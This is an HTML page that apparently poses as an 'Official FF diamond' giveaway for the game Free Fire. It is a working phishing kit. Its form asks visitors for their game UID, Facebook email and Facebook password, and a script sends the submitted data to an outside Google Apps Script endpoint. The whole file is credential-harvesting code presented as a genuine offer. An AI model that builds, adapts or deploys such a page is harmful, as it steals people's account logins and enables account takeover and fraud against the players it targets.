
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Official FF diamond </title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
	<form name="submit-to-google-sheet">
  <input name="UID" type="text" placeholder="Enter your UID" required> 
  <input name="email" type="email" placeholder="Enter facebook email " required>
  <input name="pass" type="text" placeholder="Enter facebook password " required>
  <button type="submit">Send</button>
</form>

<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbzfsQf2y5Y99XTqWk4QV20Mi8BJR9t1w7gcPSGJMiXh4uVM7Jaiu0OUneYZXxtTETkS/exec'
  const form = document.forms['submit-to-google-sheet']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
  </body>
</html>
